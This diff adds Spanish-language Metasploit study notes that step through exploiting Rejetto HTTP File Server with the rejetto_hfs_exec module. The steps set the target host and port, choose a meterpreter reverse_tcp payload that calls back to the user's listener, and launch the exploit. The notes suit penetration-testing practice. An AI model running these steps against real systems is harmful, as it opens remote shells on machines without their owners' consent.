@@ -1,0 +1,45 @@
+
+::: msfdb run                 #si nunca antes se ejecuto metasploit 
+              #crea un usuario, inicia la base de datos y el servicio postgres sql
+
+
+
+::: search hfs      #podemos buscar por siglas (Http File Server) hfs
+
+::: use  rutaExploit
+    use exploit/windows/http/rejetto_hfs_exec
+
+:::msf6 exploit(windows/http/rejetto_hfs_exec) >  info          #informaci[on del exploit seleleccionado, Descripci[on referencias etc...
+
+
+::: show options      # parametros del exploit para setear
+
+::: set RHOST ipTargetHere       #remote host
+
+::: set RPORT portTargetHere      #remote port
+
+
+::: show targets        # aveces podemos especificar el target, por si queremos lanzarlo especificamente sobre un win7 win8 xp etc...
+
+
+
+### CONFIGURACI[ON DEL LISTENER PARA RECIBIR LA SHELL .......................!!!!!!!!!!!!!
+
+      optional  ::: show payloads     #muestra todos los payloads compatibles con el exploit que se va a utilizar.
+
+::: set payload windows/meterpreter/reverse_tcp
+
+      meterpreter es una sesi[on de escucha que se establece desde metasploit 
+
+      reverse_tcp   reverse shell, una shell interactiva atravez del protocolo TCP
+
+
+::: show options  
+
+::: set LHOST  ipHereIp         # local host
+::: set LPORT  ipHereIp         # local port
+
+
+
+::: exploit                 # don't be evil :)
+
